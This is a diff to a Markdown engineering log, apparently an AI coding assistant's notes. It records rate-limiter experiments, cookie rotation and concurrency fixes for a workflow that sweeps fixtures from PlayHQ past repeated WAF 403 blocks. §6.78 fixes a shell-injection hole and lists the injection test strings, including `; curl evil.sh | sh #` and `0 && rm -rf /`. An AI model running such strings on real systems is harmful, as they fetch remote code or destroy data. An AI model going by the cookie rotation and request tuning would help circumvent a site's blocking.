@@ -4900,5 +4900,492 @@ paths; a disk cookie starts spent; progress lines carry a clock.
 
 ---
 
-**Highest trap number after this session: T78.** Before adding one, run
+## §6.76 — The rate ceiling, measured at last; and the backfill's hard limit (2026-10-13)
+
+`--season=1ae60211`, 2,093 teams, 11.2 min, **6 WAF blocks costing 9 of those minutes.** The
+clock added in §6.75 is what made the run readable.
+
+### The ceiling is ~320-420 requests per rolling 60s
+The window count at the moment of each block:
+
+```
+block #1  366      block #3  322      block #5  362
+block #2  422      block #4  342      block #6  342
+```
+
+⚠️ **`playhq_api_reference`'s ~1,256-1,790 per ~80s (~940-1,340/min) DOES NOT DESCRIBE THIS
+OPERATION.** The real trip for `discoverTeamFixture` is a third of that. 600/min never bound — the
+block always arrived first, which is why the gate changed nothing in the cron run. **Default is now
+300**, under the lowest observed trip with room to spare.
+
+### And it settles budget vs rate, which two sessions of probes could not
+Block #1 came 100 teams after a FRESH cookie. Block #2 came ~160 teams after a rotation. **The call
+counts differ; the window counts do not.** It is a rate. The 200-330 call intervals that looked
+like §6.59's budget in the cron log were that rate seen at concurrency 20 — roughly 16-21 batches
+of 20 — and nothing more. `ROTATE_AFTER` stays because a cookie has a real TTL and rotating costs
+one request, but §6.75 was wrong to call it the fix.
+
+### ⚠️ THE BACKFILL CANNOT REACH OLD ROUNDS, AND THIS RUN PROVES IT
+All 2,093 teams fetched; **0 new, 0 updated.** EDJBA is still at 41% — 7,576 games without `gn`,
+unchanged. The missing games are not obscure: `11340774` Collingwood U13 Boys 1, Round 9, 18 July,
+FINAL; `11595081` Bulleen U13 Girls 10, Round 11. Those teams were all in the 2,093.
+
+**`discoverTeamFixture` returns a team's CURRENT fixture, not its season history.** Rounds that
+have fallen out of it are unreachable by this route, so no number of sweeps will ever backfill
+them. The §6.66 fix works only on what the endpoint still returns — which is why `5e26f10f`
+(current, 94% → 97%) improved and `1ae60211` (July-August rounds) cannot.
+
+**Consequence for the §6.68 worklist:** seasons short of `gn` in OLD rounds are not a dispatch
+problem and will not clear. Backfilling them needs a different source — the grade's own fixture
+(`discoverFixtureByRound` per grade/round) or the per-game endpoint. `audit-grade-coverage.js`
+should be read with that in mind: a season at 41% is not necessarily a season waiting on a sweep.
+
+---
+
+## §6.77 — T79: A ROLLING COUNTER IS NOT A PACER (2026-10-13)
+
+`--rate=300` on the same season, as a controlled repeat of §6.76:
+
+| | 600/min | 300/min |
+|---|---|---|
+| WAF blocks | 6 | **8** |
+| paused | 9 min | **12 min** |
+| elapsed | 11.2 min | **17.8 min** |
+
+⚠️ **HALVING THE LIMIT MADE IT WORSE.** That is not a tuning result, it is a refutation: the
+gate was not doing what its name said.
+
+### The fault
+`rateGate` capped requests per rolling 60s and nothing else. After a 90-second block pause **every
+entry in the window has aged out**, so the window is empty and the gate admits a full allowance
+instantly. At concurrency 20 that is ~300 requests in 13-15 seconds — **the same instantaneous
+rate as no gate at all.** Lowering the cap only shrank each burst; it never changed the shape, so
+the next block arrived just as fast and there were simply more of them.
+
+The log says it plainly once you read the gaps between blocks rather than the counts: **~17s of
+work per block at 600, ~13s at 300.** Both are bursts. Neither is a rate.
+
+> **T79 — A ROLLING-WINDOW COUNTER LIMITS THE AVERAGE AND PERMITS THE BURST.** A limiter that
+> only counts requests per window admits a whole window's worth in one instant after any idle
+> period, and an idle period is exactly what a backoff creates. Against a WAF that reacts to
+> instantaneous rate this is indistinguishable from no limiter. Pace by enforcing a MINIMUM GAP
+> between admissions; keep the window cap as a second, slower bound.
+
+### The fix
+`_minGapMs = 60000 / RATE_PER_MIN`, checked **before** the window cap. 300/min is now one request
+every 200ms, enforced between admissions, so twenty concurrent callers are paced rather than firing
+together. The startup line says `PACED` and prints the gap, so a future log shows which build ran.
+
+⚠️ **The ceiling figures in §6.76 are therefore NOT a measurement of a rate ceiling.** 366 /
+422 / 322 / 342 / 362 / 342 were burst sizes, not sustainable rates. What the WAF tolerates when
+requests are actually spaced is still unknown, and the next run is the first that can answer it.
+
+`harness8.cjs` 30 → 36. The new section replays the exact failure: a block pause, then 300 calls
+released at once — un-paced they all land in the same instant; paced, no more than six land in the
+first second, the 300 span a full minute, and no two admissions are closer than the configured gap.
+Pacing also changed what the older assertions mean, so section A now checks that ten admissions at
+10/min are SPREAD over ~54s rather than, as before, that they cost nothing.
+
+
+---
+
+## §6.78 — T80: the pacer broke the single-flight lock, and the gate goes back to opt-in (2026-10-13)
+
+Fourth run of `1ae60211`, this time at `--rate=300` with §6.77's pacing in. **Worse again**, and
+the log carried something that had never appeared before:
+
+```
+⏸ DiscoverGrade: HTTP 403 — pausing ALL requests for 90s (block #1)
+… DiscoverGrade: HTTP 403 — session refused, re-authenticating (1/2)   [×many]
+  Fetching session cookie...   [×8 interleaved]
+  ✓ Cookie obtained            [×8 in a row]
+```
+
+Eight bootstraps for one refusal. Every one of those is an extra unauthenticated round trip to the
+host that had just blocked us, fired while we were supposedly parked.
+
+### The fault
+
+`invalidateSession()` did two things: it nulled `_cookie`, and it nulled `_sessionPromise`.
+`_sessionPromise` is the **single-flight lock** — the one thing stopping twenty concurrent callers
+from each starting their own bootstrap. Clearing it was survivable only by accident: before pacing,
+all twenty callers arrived inside the same tick, so the first one to re-enter `getSession()` set the
+promise and the other nineteen joined it.
+
+Pacing spread those callers out in time. Now caller 1 starts a bootstrap, caller 2 arrives 200ms
+later, sees `_sessionPromise === null`, and starts its own. Eight callers, eight bootstraps.
+
+**The pacing change did not cause the bug. It removed the timing coincidence that had been hiding
+it since the lock was written.**
+
+> **T80 — DO NOT CLEAR THE SINGLE-FLIGHT PROMISE WHEN INVALIDATING WHAT IT PRODUCED.** The promise
+> is the lock; the value is the product. Invalidating the product must not release the lock, or
+> every concurrent caller re-acquires it. A refresh already in flight **is** the refresh this caller
+> wants. To make "my cookie was refused" distinguishable from "someone already replaced it", version
+> the product and compare generations — never reach for the lock.
+
+### The fix
+
+```js
+let _cookieGen = 0;
+function invalidateSession(gen) {
+  if (gen !== undefined && gen !== _cookieGen) return;   // already rotated past it
+  _cookie = null;
+  _cookieGen++;
+  try { if (fs.existsSync(COOKIE_FILE)) fs.unlinkSync(COOKIE_FILE); } catch (_) {}
+}
+```
+
+and in `gql()`:
+
+```js
+const cookie = await getSession();
+const gen = _cookieGen;            // which cookie THIS call is using
+// … on 403:
+noteBlocked(`${operationName}: HTTP 403`);
+invalidateSession(gen);            // no-op if a sibling already rotated it
+```
+
+`_sessionPromise` is never touched outside `getSession()`'s own `finally`. The generation guard also
+fixes a second, quieter waste: twenty callers holding the *same* refused cookie now cause **one**
+rotation between them, not twenty.
+
+### The gate goes back to opt-in
+
+Four controlled repeats of the same season, same code path, same day:
+
+| build | blocks | elapsed |
+|---|---|---|
+| no gate (pre-§6.74) | 3 bursts over 863 teams | work committed |
+| 600/min rolling counter | 6 | 11.2 min |
+| 300/min rolling counter | 8 | 17.8 min |
+| 300/min PACED | worse again | + 8-way bootstrap storm |
+
+⚠️ **Every limiter value tried has been worse than no limiter.** That is now four data points in one
+direction, and the honest reading is that **the rate ceiling remains unmeasured** and every number
+put into `--rate` so far has been invented. `RATE_PER_MIN` therefore defaults to **0 — off** . The
+pacing code stays, because it is now correct and covered, but it is opt-in until a measurement
+justifies a number. The default is the configuration closest to the best result observed.
+
+The comparison table lives in the source as a comment above `RATE_PER_MIN`, so the next person to
+reach for a number sees what the last four cost first.
+
+### What was NOT established
+
+The "ceiling" figures in §6.76 stay retracted (§6.77). Nothing here measures a sustainable rate
+either — this run was aborted as a tuning attempt, not completed as a measurement. The open
+question is unchanged: **what instantaneous rate does the WAF tolerate when requests are genuinely
+spaced?** Answering it needs a run designed to answer it, not another sweep with a guess in it.
+
+`harness10.cjs`, 14 assertions, all passing. It pins the failure mode directly: *eight STAGGERED
+403s on one cookie produce ONE bootstrap* — the exact assertion that would have caught this before
+the run. Also: `invalidateSession` does not null `_sessionPromise`; a stale generation is ignored;
+two successive real refusals still rotate twice; a generation-less caller still rotates; the default
+rate is 0.
+
+### Two faults in `discover-fixtures.yml` found while writing this up
+
+**1. The dispatch form contradicted the code.** The `rate` input still described itself as
+*"300 is the default and is MEASURED: … 366/422/322/342/362/342"*. The script default is 0 and
+those figures were retracted in §6.77 as burst sizes. A description that outlives the thing it
+describes is worse than no description: it is a measurement claim with nothing behind it, sitting
+in the one place an operator reads before dispatching. Rewritten to state the four-run result and
+that no value should be set without a measurement behind it.
+
+**2. Directive 13 / T27 was violated in this very file.** Eleven `if [ -n "${{ inputs.X }}" ]`
+lines spliced dispatcher-supplied text into the `run:` script. `--season='; curl … | sh #'` would
+have executed. Inputs now reach bash through `env:` only, are accumulated into a bash ARRAY rather
+than a string, and each value is checked against `[A-Za-z0-9._-]` before use — a rejected value
+fails the step loudly rather than being quietly dropped.
+
+Two bash traps were hit writing it, both verified against the real gate rather than reasoned about:
+
+- `"${ARGS[@]-}"` on an EMPTY array expands to **one empty argument**, not to nothing. The correct
+  form is `${ARGS[@]+"${ARGS[@]}"}`. With all inputs blank the old form would have handed the
+  script an empty argv entry.
+- `[ "$1" = "true" ] && ARGS+=("$2")` as the last line of a function returns non-zero when the test
+  fails, which under `set -euo pipefail` kills the step. Written as a plain `if`.
+
+Eight cases executed against the gate extracted from the YAML: season-only, all-blank (**zero**
+args, confirmed), the full set, the schedule path, a boolean flag, a space in a value, and two
+injection attempts (`; curl evil.sh | sh #` and `0 && rm -rf /`) — both rejected.
+
+⚠️ **The same interpolation pattern is likely in other workflows.** This was found by accident
+while checking an input name. It has not been swept for.
+
+---
+
+## §6.79 — The block is a REQUEST BUDGET, and §6.78's default was set on a misreading (2026-10-13)
+
+The run that followed §6.78 was dispatched with the gate OFF. Its full log is the first that
+carries a clock through four blocks, and it overturns two things said above.
+
+### Retracted: "rotation causes the block"
+
+On the first half of the log, block #1 followed the 261-call rotation and block #2 followed the
+263-call rotation, with nothing blocked in the 261 calls before either. That is a clean mechanism
+and it is wrong: **blocks #3 and #4 had no rotation before them at all.** Two co-occurrences and a
+plausible story, refuted by reading further down the same log. Recorded because this is the third
+time in this file a snapshot has been read as a cause.
+
+### What the log actually measures
+
+| | resumed | blocked | work | teams |
+|---|---|---|---|---|
+| block #2 | 109s | 122s | 13s | ~280 |
+| block #3 | 213s | 222s | 9s | ~200 |
+| block #4 | 314s | 322s | 8s | ~180 |
+| (to rotation) | 414s | — | 13s | ~260 |
+
+Two facts fall straight out:
+
+1. **Sustained rate is ~20-22 requests/second** — concurrency 20 against ~1s latency. Identical in
+   every window, because nothing was limiting it.
+2. **The WAF permits roughly 180-280 requests, then blocks for ~90s.** It is a budget per recovery
+   window, not a rate the connection settles at.
+
+And therefore: **elapsed ≈ 90s × blocks.** Work time is noise — 43 seconds of it across 7 minutes
+of run. Any configuration is judged on BLOCKS PER TEAM and nothing else.
+
+### §6.78's default was wrong
+
+§6.78 set `RATE_PER_MIN` to 0 and justified it as *"the configuration closest to the best result
+observed"*. On the metric that matters it is the **worst** of the four:
+
+| build | blocks | teams | **blocks per team** |
+|---|---|---|---|
+| no gate (pre-§6.74) | 3 | 863 | 1 per 288 |
+| no gate (2026-10-13) | 4 | 940 | **1 per 235 — worst** |
+| 300/min counter | 8 | 2093 | 1 per 262 |
+| 600/min counter | 6 | 2093 | **1 per 349 — best** |
+| 300/min PACED | — | — | confounded by T80; discard |
+
+The error was comparing 3 blocks over 863 teams against 6 and 8 blocks over 2093 and reading the
+small numbers as the good ones. **Normalise before concluding.** Default is now 600.
+
+> **T81 — A COUNT IS NOT A RATE UNTIL YOU DIVIDE IT BY THE WORK.** Comparing runs by raw event
+> count ranks the short run best every time. Normalise to the unit the run exists to produce
+> before any of them is called better, and state the denominator next to the figure so the next
+> reader cannot repeat the mistake.
+
+**Paced 600 has still never been run cleanly** — the one paced run was destroyed by T80, now fixed.
+That is the open measurement. 600 is where the evidence points, not where it ends.
+
+### A refused bootstrap was not a block (fixed)
+
+`noteBlocked()` was called on a refused QUERY but not on a refused BOOTSTRAP. The log ends on three
+refused bootstraps over 120s of backoff with no pause declared and no block counted — so the other
+19 callers were never parked and kept firing into a live block for the whole two minutes. The
+bootstrap path now calls `noteBlocked()` before its first retry.
+
+### Three instrumentation faults this log exposed, all fixed
+
+1. **`0/min` for the entire run.** The progress line read `_rateWindow.length`, which only
+   `rateGate` fed — so with the gate off the throughput column was dead in exactly the
+   configuration being measured. `noteRequest()` now stamps the window when the gate is off.
+   ⚠️ A first attempt moved the stamp OUT of `rateGate` entirely, which broke the gate's atomic
+   check-and-set: between admitting and stamping, the window read one short and an extra caller
+   slipped the cap under 300-way concurrency. The gate stamps its own admission; `noteRequest`
+   stands down whenever the gate is on. The original comment warned about this invariant and the
+   change ignored it.
+2. **Twenty "re-authenticating" lines for one rotation.** The T80 guard was working; the log was
+   describing each caller's intent rather than what happened. `invalidateSession()` now returns
+   whether it acted, and the message says "already rotated — waiting" when it did not. A log that
+   overstates the work is the same fault as one that hides it.
+3. **A refused team was counted as a clean zero.** `processTeam` returned `{added:0,updated:0}`
+   whether the call succeeded with no fixture or failed outright, so "0 new, 0 updated" across 940
+   teams could not be distinguished from 940 refusals. `gql` returning null now yields
+   `refused:true`; the per-season and run summaries report unread teams, say the totals are a
+   LOWER BOUND, and emit a `::warning::`. This had been flagged and left unfixed for two sessions
+   while every run's "0 new, 0 updated" was read at face value.
+
+`harness8.cjs` 36 → 38 (the gate's atomic reservation and `noteRequest`'s stand-down are both
+pinned). `harness10.cjs` updated for the new return value and the 600 default. All harnesses green:
+56 · 84 · 24 · 20 · 38 · 21 · 14.
+
+---
+
+## §6.80 — SETTLED: the 600/min counter ships, pacing loses, stop tuning (2026-10-13)
+
+Paced 600, with T80 fixed so the run was finally clean:
+
+```
+Rate limit:  600 req/min = 1 every 100ms, PACED
+  block #1 — during grade resolution, before a single team
+  block #2 — at team 20 of 2093
+```
+
+**Two blocks before team 20**, and 16 over the full 2093 — **1 per 131, the worst of six
+configurations.**
+
+⚠️ **The partial log was reported here as "~1 per 10 — worst by an order". That was wrong**, and
+wrong by T81, written one section earlier in this same file: a block count divided by 20 teams is
+not a rate. The complete run puts paced 600 at 1 per 131 — still last, by 2.7x rather than 13x.
+Knowing the rule is not the same as applying it, and the gap between the two is one impatient
+paragraph.
+
+| config | blocks | teams | blocks per team |
+|---|---|---|---|
+| **600/min counter** | 6 | 2093 | **1 per 349 — SHIPPED** |
+| no gate (pre-§6.74) | 3 | 863 | 1 per 288 |
+| 300/min counter | 8 | 2093 | 1 per 262 |
+| no gate (2026-10-13) | 4 | 940 | 1 per 235 |
+| 300/min PACED | — | — | ruined by T80; discard |
+| **600/min PACED** | 16 | 2093 | **1 per 131 — worst** |
+
+**Pacing makes it worse.** Spacing requests evenly brought the block SOONER, twice, at two
+different rates. That is the opposite of what rate-limiter intuition predicts, and §6.77 built the
+pacer on exactly that intuition. The mechanism is not understood. **It does not need to be.** The
+measurement is consistent, and the remaining prize — roughly 9 minutes of pausing on a weekly job —
+is worth less than what has already been spent chasing it.
+
+`--rate` stays 600 (rolling counter). `--pace` is opt-in and OFF. The decision table lives in the
+source above `RATE_PER_MIN` so the next person to reach for this sees six results before touching it.
+
+> **T82 — WHEN SIX MEASUREMENTS AGREE AND THE MECHANISM DOES NOT, SHIP THE MEASUREMENT.** A fault
+> that is reproducible, bounded and cheap does not have to be explained to be closed. Tuning past
+> the point where the remaining prize is smaller than the cost of another run is not rigour.
+
+### What this cost
+
+§6.74 through §6.80 is seven sections and six dispatched runs to land on a value that was already
+in the file before §6.74 removed it. Four of those runs were spent on numbers invented rather than
+measured, and two of the "findings" along the way (§6.76's ceiling, §6.78's default, and in this
+session a rotation-causes-the-block story) were retracted. The pattern in every case was the same:
+a plausible mechanism asserted from one log, then acted on before the next log could contradict it.
+
+What the six runs DID buy, and what justifies keeping them in the record:
+
+- **T79** — a rolling counter is not a pacer.
+- **T80** — do not clear the single-flight promise on invalidate. A latent fault since the lock was
+  written, exposed only because pacing changed the arrival timing.
+- **T81** — a count is not a rate until you divide it by the work.
+- **T82** — above.
+- Four instrumentation faults that made every previous log unreadable: a dead throughput column, a
+  log overstating rotations twenty to one, refused teams counted as clean zeros, and a refused
+  bootstrap that never declared a block.
+- Directive 13 / T27 violated in `discover-fixtures.yml` itself, found by accident.
+
+### Confirmed in this run
+
+The T80 fix works, visibly: nineteen `refused on cookie gen 1, already rotated — waiting` lines and
+**exactly one** `Fetching session cookie`. The same situation produced eight bootstraps before the
+fix and twenty misleading "re-authenticating" lines before §6.79.
+
+### SETTLED by this run: EDJBA holds nothing new on this route
+
+The paced run went to completion, and it is the first sweep in this whole sequence that can be
+trusted at face value:
+
+```
+Teams:         2,093        Added: 0     Updated: 0
+403s seen:     248          Calls dropped: 0     Transient: 0
+```
+
+**248 refusals, every one recovered. Zero calls dropped, zero teams unread.** So "0 new, 0 updated"
+across all 2,093 EDJBA teams is a RESULT, not an artefact of teams that were never read — which is
+exactly what the §6.79 refused-team instrumentation was built to establish, and it earned its keep
+on its first run.
+
+For EDJBA, this closes a question open since §6.71: that season's 41% `gn` coverage is not
+reachable by `discoverTeamFixture`, because the endpoint returns a team's CURRENT fixture and those
+rounds have rolled off it.
+
+⚠️ **THIS WAS WRITTEN AS A PROPERTY OF THE ENDPOINT. IT IS A PROPERTY OF THAT SEASON.** §6.81's
+full sweep backfilled `gid`/`gn` across thousands of games in other seasons using the same call.
+One season generalised to ninety-seven — the same error as T81, made in the section that records
+T81. See §6.81.
+
+### Still open, and NOT to be solved by tuning this gate
+
+- `discoverTeamFixture` returns a team's CURRENT fixture, so the ~7,576 EDJBA games at 41% `gn`
+  cannot be reached by this sweep at all. That needs `discoverFixtureByRound` per grade/round or
+  the per-game endpoint — a different route, not a different rate.
+- Whether EDJBA's 940 swept teams genuinely hold no new games is still unknown: every run so far
+  reported "0 new, 0 updated" with refusals counted as zeros. The next full run is the first that
+  can answer it, because refusals are now reported.
+
+---
+
+## §6.81 — The first trustworthy full sweep, and what it corrected (2026-10-13)
+
+The weekly cron had been cancelled, so a full `--current-only` sweep was dispatched by hand. It
+completed:
+
+```
+Seasons: 97    Teams: 8,181    Added: 5,011    Updated: 4,529
+WAF blocks: 38 (57 min paused)    Elapsed: 67.6 min
+403s seen: 522    Calls dropped: 0    Transient: 0
+```
+
+**`Calls dropped: 0`, no "teams unread" warning.** Every one of 522 refusals was recovered. This is
+the first sweep in the whole §6.74-§6.80 sequence whose Added/Updated figures are a RESULT rather
+than a lower bound, and the §6.79 refusal instrumentation is what makes that statable.
+
+### It corrected §6.80
+
+§6.80 said the `gn` gap was unreachable by `discoverTeamFixture` "at any rate, with any limiter, on
+any number of retries". This run backfilled `gid`/`gn` across thousands of games — U10 through U19,
+Senior and Junior Domestic, the Summer 2026/27 block. The claim was true of EDJBA and false of the
+endpoint. §6.80 has been corrected in place.
+
+What the run was actually doing, in three parts, all expected:
+
+1. **The 2026-10-12 `TRACKED` fix landing repo-wide for the first time.** `gid`/`gn` were absent
+   from `TRACKED`, so `diffEntry` never compared them and a stored fixture could never gain a
+   grade. The comment at that fix predicted exactly this backfill.
+2. **Summer 2026/27 seasons opening** — placeholder team names replaced with real ones
+   (`Team 4 U10G` → `JETS - Team 4 U10G`).
+3. **Games played since the last successful sweep**, with the cancelled cron adding a backlog.
+
+### Why the write path is safe
+
+Asked whether this could overwrite good data with bad, and the answer is structural:
+
+```js
+if (existing && (existing.hs !== undefined || existing.as !== undefined
+                 || existing.st === 'FINAL' || existing.forfeit === true)) continue;
+```
+
+**A played game is never touched** — scored, FINAL or forfeit is skipped before any comparison. The
+write surface is unplayed fixtures and new games only. Below that, every field is existing-wins
+(`hn: game.home?.name || existing?.hn || null`, conditional spreads elsewhere), so a null from
+PlayHQ cannot blank a stored value.
+
+Two gaps, one now closed:
+
+- **`rn` was the only `TRACKED` field with no fallback** (`rn: roundName`). A nameless round would
+  have blanked a stored one. Never observed; now `roundName || existing?.rn || null`.
+- **A non-empty WRONG value on an unplayed fixture still wins** (`SPURS - GREEN` → `SPURS - ORANGE`
+  is right if the team renamed, a regression if PlayHQ is wrong). Inherent to mirroring upstream;
+  the played-game guard is what bounds the damage.
+
+### T81, committed inside the warning about T81
+
+The end-of-run hint shipped in §6.80 read *"38 blocks is NORMAL at --rate=600 (expect ~1 per 349
+teams)"*. **That figure came from a ONE-season run.** A 97-season sweep spends requests no team is
+charged for — `DiscoverSeason`, `discoverTeams`, `DiscoverGrade` per season — so its blocks-per-TEAM
+is necessarily worse. This run's 1 per 215 is healthy, and against the quoted figure it reads as a
+regression. Blocks track REQUESTS; teams are not requests. The hint now quotes no figure.
+
+That is the fourth time in two days a count has been compared across different denominators, twice
+by the rule's own author. The rule is easy; noticing that the denominator changed is the hard part.
+
+### A reporting line read as an arithmetic error
+
+`index 9 → live 9 (1 missing)` looks like it cannot be right. It is: `missing` is `unseen.length`,
+a SET difference counting live grade IDs the index lacks, while the two numbers either side are
+counts. Nine and nine with one not in common means a grade was REPLACED. Reworded to
+`index 9 → live 9, 1 live grade not in index`.
+
+### Carried forward
+
+- **21 seasons on the stale-grade worklist** (11 new, 10 carried). Two hold NO grades in the index
+  at all — `a64f4aba` Craigieburn TipOff (0 → 18) and `0be684ef` Australian Panjabi Games (0 → 3).
+  The six-day lag means these are corrected on the FOLLOWING Sunday, not the next run.
+- **2 zero-team seasons** → `zero-team-seasons.json`.
+
+---
+
+**Highest trap number after this session: T82.** Before adding one, run
 `grep -oE "T[0-9]+ —" claude_context.md | grep -oE "[0-9]+" | sort -n | tail -1`.
